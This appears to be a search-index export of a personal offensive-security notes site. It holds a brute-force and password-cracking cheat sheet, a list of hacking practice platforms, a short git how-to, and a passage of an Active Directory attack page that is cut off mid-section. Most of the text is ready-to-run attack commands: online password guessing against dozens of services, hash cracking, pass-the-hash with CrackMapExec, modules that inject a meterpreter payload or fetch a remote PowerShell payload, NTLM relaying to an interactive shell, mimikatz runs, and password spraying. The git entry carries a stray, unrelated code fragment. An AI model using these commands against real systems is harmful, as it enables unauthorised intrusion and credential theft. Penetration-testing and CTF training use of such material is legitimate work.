[{"id":0,"href":"/docs/brute_force_cracking/","title":"Brute Force Cracking","section":"Docs","content":" Brute Force Cracking # Making wordslists # Find as much information about the target as you can and generate a custom dictionary. Tools that may help:\nCrunch # crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst) @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including spac crunch 6 8 -t ,@@^^%% Cewl # cewl example.com -m 5 -w words.txt CUPP # Generate passwords based on your knowledge of the victim (names, dates\u0026hellip;) python3 cupp.py -h\npydictor # Wordlists # SecLists WordList-Compendium Kaonashi (https://github.com/google/fuzzing/tree/master/dictionaries) (https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)\nDefault Credentials # (https://github.com/ihebski/DefaultCreds-cheat-sheet) (http://www.phenoelit.org/dpl/dpl.html) (http://www.vulnerabilityassessment.co.uk/passwordsC.htm) (https://192-168-1-1ip.mobi/default-router-passwords-list/) (https://datarecovery.com/rd/default-passwords/) (https://bizuns.com/default-passwords-list) (https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv) (https://github.com/Dormidera/WordList-Compendium) (https://www.cirt.net/passwords) (http://www.passwordsdatabase.com/) (https://many-passwords.github.io/) Brute Force Cheatsheeet # Services # AFP # nmap -p 548 --script afp-brute \u0026lt;IP\u0026gt; msf\u0026gt; use auxiliary/scanner/afp/afp_login msf\u0026gt; set BLANK_PASSWORDS true msf\u0026gt; set USER_AS_PASS true msf\u0026gt; set PASS_FILE \u0026lt;PATH_PASSWDS\u0026gt; msf\u0026gt; set USER_FILE \u0026lt;PATH_USERS\u0026gt; msf\u0026gt; run AJP # nmap --script ajp-brute -p 8009 \u0026lt;IP\u0026gt; Cassandra # nmap --script cassandra-brute -p 9160 \u0026lt;IP\u0026gt; CouchDB # msf\u0026gt; use auxiliary/scanner/couchdb/couchdb_login hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get / Docker Registry # hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/ Elasticsearch # hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get / FTP # hydra -l root -P passwords.txt [-t 32] \u0026lt;IP\u0026gt; ftp ncrack -p 21 --user root -P passwords.txt \u0026lt;IP\u0026gt; [-T 5] medusa -u root -P 500-worst-passwords.txt -h \u0026lt;IP\u0026gt; -M ftp HTTP Generic Brute # WFuzz\nHTTP Basic Auth # hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/ # Use https-get mode for https medusa -h \u0026lt;IP\u0026gt; -u \u0026lt;username\u0026gt; -P \u0026lt;passwords.txt\u0026gt; -M http -m DIR:/path/to/auth -T 10 HTTP - Post Form # hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb http-post-form \u0026#34;/path/index.php:name=^USER^\u0026amp;password=^PASS^\u0026amp;enter=Sign+in:Login name or password is incorrect\u0026#34; -V # Use https-post-form mode for https For https you have to change from \u0026#34;http-post-form\u0026#34; to \u0026#34;https-post-form\u0026#34; HTTP - CMS \u0026ndash; (W)ordpress, (J)oomla or (D)rupal or (M)oodle # cmsmap -f W/J/D/M -u a -p a https://wordpress.com IMAP # hydra -l USERNAME -P /path/to/passwords.txt -f \u0026lt;IP\u0026gt; imap -V hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f \u0026lt;IP\u0026gt; imap -V nmap -sV --script imap-brute -p \u0026lt;PORT\u0026gt; \u0026lt;IP\u0026gt; IRC # nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p \u0026lt;PORT\u0026gt; \u0026lt;IP\u0026gt; ISCSI # nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 \u0026lt;IP\u0026gt; JWT # #hashcat hashcat -m 16500 -a 0 jwt.txt .\\wordlists\\rockyou.txt #https://github.com/Sjord/jwtcrack python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt #John john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256 #https://github.com/ticarpi/jwt_tool python3 jwt_tool.py -d wordlists.txt \u0026lt;JWT token\u0026gt; #https://github.com/brendan-rius/c-jwt-cracker ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8 #https://github.com/mazen160/jwt-pwn python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt #https://github.com/lmammino/jwt-cracker jwt-cracker \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\u0026#34; \u0026#34;abcdefghijklmnopqrstuwxyz\u0026#34; 6 LDAP # nmap --script ldap-brute -p 389 \u0026lt;IP\u0026gt; MQTT # ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v Mongo # nmap -sV --script mongodb-brute -n -p 27017 \u0026lt;IP\u0026gt; use auxiliary/scanner/mongodb/mongodb_login MySQL # # hydra hydra -L usernames.txt -P pass.txt \u0026lt;IP\u0026gt; mysql # msfconsole msf\u0026gt; use auxiliary/scanner/mysql/mysql_login; set VERBOSE false # medusa medusa -h \u0026lt;IP/Host\u0026gt; -u \u0026lt;username\u0026gt; -P \u0026lt;password_list\u0026gt; \u0026lt;-f | to stop medusa on first success attempt\u0026gt; -t \u0026lt;threads\u0026gt; -M mysql OracleSQL # patator oracle_login sid=\u0026lt;SID\u0026gt; host=\u0026lt;IP\u0026gt; user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017 ./odat.py passwordguesser -s $SERVER -d $SID ./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt #msf1 msf\u0026gt; use admin/oracle/oracle_login msf\u0026gt; set RHOSTS \u0026lt;IP\u0026gt; msf\u0026gt; set RPORT 1521 msf\u0026gt; set SID \u0026lt;SID\u0026gt; #msf2, this option uses nmap and it fails sometimes for some reason msf\u0026gt; use scanner/oracle/oracle_login msf\u0026gt; set RHOSTS \u0026lt;IP\u0026gt; msf\u0026gt; set RPORTS 1521 msf\u0026gt; set SID \u0026lt;SID\u0026gt; #for some reason nmap fails sometimes when executing this script nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=\u0026lt;SID\u0026gt; \u0026lt;IP\u0026gt; In order to use oracle_login with patator you need to install: pip3 install cx_Oracle --upgrade Offline OracleSQL hash bruteforce (versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3): nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30 POP # hydra -l USERNAME -P /path/to/passwords.txt -f \u0026lt;IP\u0026gt; pop3 -V hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f \u0026lt;IP\u0026gt; pop3 -V PostgreSQL # hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt \u0026lt;IP\u0026gt; postgres medusa -h \u0026lt;IP\u0026gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt \u0026lt;IP\u0026gt;:5432 patator pgsql_login host=\u0026lt;IP\u0026gt; user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt use auxiliary/scanner/postgres/postgres_login nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 \u0026lt;IP\u0026gt; PPTP # You can download the .deb package to install from https://http.kali.org/pool/main/t/thc-pptp-bruter/ sudo dpkg -i thc-pptp-bruter*.deb #Install the package cat rockyou.txt | thc-pptp-bruter –u \u0026lt;Username\u0026gt; \u0026lt;IP\u0026gt; RDP # ncrack -vv --user \u0026lt;User\u0026gt; -P pwds.txt rdp://\u0026lt;IP\u0026gt; hydra -V -f -L \u0026lt;userslist\u0026gt; -P \u0026lt;passwlist\u0026gt; rdp://\u0026lt;IP\u0026gt; Redis # msf\u0026gt; use auxiliary/scanner/redis/redis_login nmap --script redis-brute -p 6379 \u0026lt;IP\u0026gt; hydra –P /path/pass.txt redis://\u0026lt;IP\u0026gt;:\u0026lt;PORT\u0026gt; # 6379 is the default Rexec # hydra -l \u0026lt;username\u0026gt; -P \u0026lt;password_file\u0026gt; rexec://\u0026lt;Victim-IP\u0026gt; -v -V Rlogin # hydra -l \u0026lt;username\u0026gt; -P \u0026lt;password_file\u0026gt; rlogin://\u0026lt;Victim-IP\u0026gt; -v -V Rsh # hydra -L \u0026lt;Username_list\u0026gt; rsh://\u0026lt;Victim_IP\u0026gt; -v -V http://pentestmonkey.net/tools/misc/rsh-grind Rsync # nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 \u0026lt;IP\u0026gt; RTSP # hydra -l root -P passwords.txt \u0026lt;IP\u0026gt; rtsp SNMP # msf\u0026gt; use auxiliary/scanner/snmp/snmp_login nmap -sU --script snmp-brute \u0026lt;target\u0026gt; [--script-args snmp-brute.communitiesdb=\u0026lt;wordlist\u0026gt; ] onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt \u0026lt;IP\u0026gt; hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp SMB # nmap --script smb-brute -p 445 \u0026lt;IP\u0026gt; hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1 SMTP # hydra -l \u0026lt;username\u0026gt; -P /path/to/passwords.txt \u0026lt;IP\u0026gt; smtp -V hydra -l \u0026lt;username\u0026gt; -P /path/to/passwords.txt -s 587 \u0026lt;IP\u0026gt; -S -v -V #Port 587 for SMTP with SSL SOCKS # nmap -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 \u0026lt;IP\u0026gt; SQL Server # #Use the NetBIOS name of the machine as domain crackmapexec mssql \u0026lt;IP\u0026gt; -d \u0026lt;Domain Name\u0026gt; -u usernames.txt -p passwords.txt hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt \u0026lt;IP\u0026gt; mssql medusa -h \u0026lt;IP\u0026gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts \u0026lt;host\u0026gt; #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts msf\u0026gt; use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT SSH # hydra -l root -P passwords.txt [-t 32] \u0026lt;IP\u0026gt; ssh ncrack -p 22 --user root -P passwords.txt \u0026lt;IP\u0026gt; [-T 5] medusa -u root -P 500-worst-passwords.txt -h \u0026lt;IP\u0026gt; -M ssh patator ssh_login host=\u0026lt;ip\u0026gt; port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg=\u0026#39;Authentication failed\u0026#39; Telnet # hydra -l root -P passwords.txt [-t 32] \u0026lt;IP\u0026gt; telnet ncrack -p 23 --user root -P passwords.txt \u0026lt;IP\u0026gt; [-T 5] medusa -u root -P 500-worst-passwords.txt -h \u0026lt;IP\u0026gt; -M telnet VNC # hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s \u0026lt;PORT\u0026gt; \u0026lt;IP\u0026gt; vnc medusa -h \u0026lt;IP\u0026gt; –u root -P /root/Desktop/pass.txt –M vnc ncrack -V --user root -P /root/Desktop/pass.txt \u0026lt;IP\u0026gt;:\u0026gt;POR\u0026gt;T patator vnc_login host=\u0026lt;IP\u0026gt; password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!=\u0026#39;Authentication failure\u0026#39; --max-retries 0 –x quit:code=0 use auxiliary/scanner/vnc/vnc_login nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 \u0026lt;IP\u0026gt; #Metasploit use auxiliary/scanner/vnc/vnc_login set RHOSTS \u0026lt;ip\u0026gt; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst Winrm # crackmapexec winrm \u0026lt;IP\u0026gt; -d \u0026lt;Domain Name\u0026gt; -u usernames.txt -p passwords.txt Cracking Locally # Online cracking databases # (http://hashtoolkit.com/reverse-hash?) (MD5 \u0026amp; SHA1) (https://www.onlinehashcrack.com/) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF\u0026hellip;) (https://crackstation.net/) (Hashes) (https://md5decrypt.net/) (MD5) (https://gpuhash.me/) (Hashes and file hashes) (https://hashes.org/search.php) (Hashes) (https://www.cmd5.org/) (Hashes) (https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512) (https://www.md5online.org/md5-decrypt.html) (MD5) (http://reverse-hash-lookup.online-domain-tools.com/)\nZIP # #sudo apt-get install fcrackzip fcrackzip -u -D -p \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39; chall.zip zip2john file.zip \u0026gt; zip.john john zip.john #$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$ hashcat.exe -m 13600 -a 0 .\\hashzip.txt .\\wordlists\\rockyou.txt .\\hashcat.exe -m 13600 -i -a 0 .\\hashzip.txt #Incremental attack Known plaintext zip attack You need to know the plaintext (or part of the plaintext) of a file contained inside the encrypted zip. You can check filenames and size of files contained inside an encrypted zip running: 7z l encrypted.zip Download bkcrack from the releases page. # You need to create a zip file containing only the file that is inside the encrypted zip zip plaintext.zip plaintext.file ./bkcrack -C \u0026lt;encrypted.zip\u0026gt; -c \u0026lt;plaintext.file\u0026gt; -P \u0026lt;plaintext.zip\u0026gt; -p \u0026lt;plaintext.file\u0026gt; # Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18 # With that key you can create a new zip file with the content of encrypted.zip # but with a different pass that you set (so you can decrypt it) ./bkcrack -C \u0026lt;encrypted.zip\u0026gt; -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd unzip unlocked.zip #User new_pwd as password 7z # cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z #Download and install requirements for 7z2john wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl apt-get install libcompress-raw-lzma-perl ./7z2john.pl file.7z \u0026gt; 7zhash.john PDF # apt-get install pdfcrack pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt #pdf2john didn\u0026#39;t work well, john didn\u0026#39;t know which hash type was # To permanently decrypt the pdf sudo apt-get install qpdf qpdf --password=\u0026lt;PASSWORD\u0026gt; --decrypt encrypted.pdf plaintext.pdf PDF Owner Password # To crack a PDF Owner password check this: https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/\nJWT # git clone https://github.com/Sjord/jwtcrack.git cd jwtcrack #Bruteforce using crackjwt.py python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt #Bruteforce using john python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc \u0026gt; jwt.john john jwt.john #It does not work with Kali-John NTLM cracking # Format:USUARIO:ID:HASH_LM:HASH_NT::: john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot Keepass # sudo apt-get install -y kpcli #Install keepass tools like keepass2john keepass2john file.kdbx \u0026gt; hash #The keepass is only using password keepass2john -k \u0026lt;file-password\u0026gt; file.kdbx \u0026gt; hash # The keepass is also using a file as a needed credential #The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john john --wordlist=/usr/share/wordlists/rockyou.txt hash Keberoasting # john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi Lucks image # Method 1 # Install: https://github.com/glv2/bruteforce-luks bruteforce-luks -f ./list.txt ./backup.img cryptsetup luksOpen backup.img mylucksopen ls /dev/mapper/ #You should find here the image mylucksopen mount /dev/mapper/mylucksopen /mnt Method 2 # cryptsetup luksDump backup.img #Check that the payload offset is set to 4096 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1 hashcat -m 14600 -a 0 luckshash wordlists/rockyou.txt cryptsetup luksOpen backup.img mylucksopen ls /dev/mapper/ #You should find here the image mylucksopen mount /dev/mapper/mylucksopen /mnt Another Luks BF tutorial: http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1 Mysql # #John hash format \u0026lt;USERNAME\u0026gt;:$mysqlna$\u0026lt;CHALLENGE\u0026gt;*\u0026lt;RESPONSE\u0026gt; dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d PGP/GPG Private key gpg2john private_pgp.key #This will generate the hash and save it in a file john --wordlist=/usr/share/wordlists/rockyou.txt ./hash DPAPI Master Key # Use https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py and then john\nOpen Office Pwd Protected Column # If you have an xlsx file with a column protected by a password you can unprotect it: Upload it to google drive and the password will be automatically removed To remove it manually: unzip file.xlsx grep -R \u0026#34;sheetProtection\u0026#34; ./* # Find something like: \u0026lt;sheetProtection algorithmName=\u0026#34;SHA-512\u0026#34; hashValue=\u0026#34;hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg\u0026#34; saltValue=\u0026#34;U9oZfaVCkz5jWdhs9AA8nA\u0026#34; spinCount=\u0026#34;100000\u0026#34; sheet=\u0026#34;1\u0026#34; objects=\u0026#34;1\u0026#34; scenarios=\u0026#34;1\u0026#34;/\u0026gt; # Remove that line and rezip the file zip -r file.xls . PFX Certificates # # From https://github.com/Ridter/p12tool ./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt # From https://github.com/crackpkcs12/crackpkcs12 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx Tools # Hash examples: https://openwall.info/wiki/john/sample-hashes\nHash-identifier # hash-identifie4 \u0026gt; \u0026lt;HASH\u0026gt; Wordlists # Rockyou Probable-Wordlists Kaonashi Seclists - Passwords Wordlist Generation Tools # kwprocessor: Advanced keyboard-walk generator with configurable base chars, keymap and routes. kwp64.exe basechars\\custom.base keymaps\\uk.keymap routes\\2-to-10-max-3-direction-changes.route -o D:\\Tools\\keywalk.txt John mutation # Read /etc/john/john.conf and configure it\njohn --wordlist=words.txt --rules --stdout \u0026gt; w_mutated.txt john --wordlist=words.txt --rules=all --stdout \u0026gt; w_mutated.txt #Apply all rules "},{"id":1,"href":"/docs/training_grounds/","title":"Training Grounds","section":"Docs","content":" Training Grounds # Online Websites and Communities # HackTheBox.EU \u0026amp; HTB Catalogue Hackthebox has online machines to hack, it\u0026rsquo;s a pretty solid training ground, I personally lean towards TryHackMe. But, you should practie everywhere and often. Try learning by doing retired machines following Ippsec videos. HackTheBox Academy is connected to HackerOne.\nTryHackMe Tryhackme is another formidable learning platform. Some rooms are simply walkthroughs where you can read, learn and basically just type what they tell you, other rooms require some self-study to complete and there\u0026rsquo;s also challenge rooms, CTFs and King of the Hill competition mode!\nProvingGrounds Offensive Security\u0026rsquo;s Proving Grounds. This place also has training areas for learning, CTF machines for playing and testing your skills and more. Less organized but just as powerful as TryHackMe or HackTheBox\nRootMe Rootme is another resource for online hosted virtual machines to hack.\nVulnHub Vulnhub has virtual machine images you can download and then try to hack.\nhack.me This site seems to be a community platform\nHacker101 free site with videos and CTFs\nCrackMes This site has a lot of binaries for forensic learning.\nHackThisSite HackThisSite has been around for a very long time and has a lot of challenges to test your skill sets.\nAttackDefense AttackDefense launched in the last few years and has a lot of online resources for practicing and learning.\nPortSwigger PortSwigger is the creator of the awesome BurpSuite proxy tool (and more), it has labs for you to learn and practice on.\nHackerRank HackerRank is a good site for keeping your coding skills fresh.\n"},{"id":2,"href":"/posts/update-github-repo/","title":"Updating a github repository after cloning","section":"Blog","content":" Updating Github Repos # println(\u0026ldquo;Hamming difference of: ${count}\u0026quot;)It\u0026rsquo;s been a nuisance to create your own or fork another, clone it, update the remotes for SSH and then get back to business. This reference is just a quick 1, 2, 3\u0026hellip; to-do/check list of steps for ease of reference!\nCreate repository on Github - Go to the website and just create one using their form, get the empty skeleton Clone repository - git clone \u0026lt;your repo\u0026gt; Remove remotes - git remote remove origin Add SSH remotes - git remote add origin git@github.com:m00tiny/todo-android - You can combine the above two by using \u0026#39;git remote set-url origin get@github.com:m00tiny/todo-android\u0026#39; Quick commit and push - git add . - git commit -m \u0026#39;.\u0026#39; - git push "},{"id":3,"href":"/docs/attacking_active_directory/","title":"Active Directory Attacks","section":"Docs","content":" Active Directory Attacks # Tools # Impacket or the Windows version\nResponder\nInveighZero\nMimikatz\nRanger\nAdExplorer\nCrackMapExec\n# use the latest release, CME is now a binary packaged will all its dependencies root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip # execute cme (smb, winrm, mssql, ...) root@payload$ cme smb -L root@payload$ cme smb -M name_module -o VAR=DATA root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#39;:5858d47a41e40b40f294b3100bea611f\u0026#39; -d \u0026#39;DOMAIN\u0026#39; -M invoke_sessiongopher root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443 root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#34;:5858d47a41e40b40f294b3100bea611f\u0026#34; -M web_delivery -o URL=\u0026#34;https://IP:PORT/posh-payload\u0026#34; root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#34;:5858d47a41e40b40f294b3100bea611f\u0026#34; --exec-method smbexec -X \u0026#39;whoami\u0026#39; root@payload$ cme smb 10.10.14.0/24 -u user -p \u0026#39;Password\u0026#39; --local-auth -M mimikatz root@payload$ cme mimikatz --server http --server-port 80 Mitm6\ngit clone https://github.com/fox-it/mitm6.git \u0026amp;\u0026amp; cd mitm6 pip install . mitm6 -d lab.local ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i # -wh: Server hosting WPAD file (Attacker’s IP) # -t: Target (You cannot relay credentials to the same device that you’re spoofing) # -i: open an interactive shell ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access ADRecon\n.\\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\\myuser Active Directory Assessment and Privilege Escalation Script\npowershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 Ping Castle\npingcastle.exe --healthcheck --server \u0026lt;DOMAIN_CONTROLLER_IP\u0026gt; --user \u0026lt;USERNAME\u0026gt; --password \u0026lt;PASSWORD\u0026gt; --advanced-live --nullsession pingcastle.exe --healthcheck --server domain.local pingcastle.exe --graph --server domain.local pingcastle.exe --scanner scanner_name --server domain.local available scanners are:aclcheck,antivirus,computerversion,foreignusers,laps_bitlocker,localadmin,nullsession,nullsession-trust,oxidbindings,remote,share,smb,smb3querynetwork,spooler,startup,zerologon,computers,users Kerbrute\n./kerbrute passwordspray -d \u0026lt;DOMAIN\u0026gt; \u0026lt;USERS.TXT\u0026gt; \u0026lt;PASSWORD\u0026gt; Rubeus\nRubeus.exe asktgt /user:USER \u0026lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH\u0026gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid] Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID] Rubeus.exe klist [/luid:LOGINID] Rubeus.exe kerberoast [/spn:\u0026#34;blah/blah\u0026#34;] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\u0026#34;OU=,...\u0026#34;] AutomatedLab\nNew-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV Add-LabMachineDefinition -Name FirstServer -OperatingSystem \u0026#39;Windows Server 2016 SERVERSTANDARD\u0026#39; Install-Lab Show-LabDeploymentSummary Active Directory Recon # Using BloodHound # Use the correct collector\nAzureHound for Azure Active Directory\nSharpHound for local Active Directory\nuse AzureHound\n# require: Install-Module -name Az -AllowClobber # require: Install-Module -name AzureADPreview -AllowClobber Connect-AzureAD Connect-AzAccount . .\\AzureHound.ps1 Invoke-AzureHound use BloodHound\n# run the collector on the machine using SharpHound.exe # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe .\\SharpHound.exe -c all -d active.htb --searchforest .\\SharpHound.exe -c all,GPOLocalGroup # all collection doesn\u0026#39;t include GPOLocalGroup by default .\\SharpHound.exe --CollectionMethod DCOnly # only collect from the DC, doesn\u0026#39;t query the computers (more stealthy) .\\SharpHound.exe -c all --LdapUsername \u0026lt;UserName\u0026gt; --LdapPassword \u0026lt;Password\u0026gt; --JSONFolder \u0026lt;PathToFile\u0026gt; .\\SharpHound.exe -c all --LdapUsername \u0026lt;UserName\u0026gt; --LdapPassword \u0026lt;Password\u0026gt; --domaincontroller 10.10.10.100 -d active.htb .\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23 # or run the collector on the machine using Powershell # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 Invoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public Invoke-BloodHound -CollectionMethod All -LDAPUser \u0026lt;UserName\u0026gt; -LDAPPass \u0026lt;Password\u0026gt; -OutputDirectory \u0026lt;PathToFile\u0026gt; # or remotely via BloodHound Python # https://github.com/fox-it/BloodHound.py pip install bloodhound bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all Collect more data for certificates exploitation using Certipy\ncertipy find \u0026#39;corp.local/john:Passw0rd@dc.corp.local\u0026#39; -bloodhound certipy find \u0026#39;corp.local/john:Passw0rd@dc.corp.local\u0026#39; -old-bloodhound certipy find \u0026#39;corp.local/john:Passw0rd@dc.corp.local\u0026#39; -vulnerable -hide-admins -username user@domain -password Password123 Then import the zip/json files into the Neo4J database and query them.\nroot@payload$ apt install bloodhound # start BloodHound and the database root@payload$ neo4j console # or use docker root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j root@payload$ ./bloodhound --no-sandbox Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j You can add some custom queries like :\nBloodhound-Custom-Queries from @hausec BloodHoundQueries from CompassSecurity BloodHound Custom Queries from Exegol - @ShutdownRepo Certipy BloodHound Custom Queries from ly4k Replace the customqueries.json file located at /home/username/.config/bloodhound/customqueries.json or C:\\Users\\USERNAME\\AppData\\Roaming\\BloodHound\\customqueries.json.\nUsing PowerView # Get Current Domain: Get-NetDomain\nEnum Other Domains: 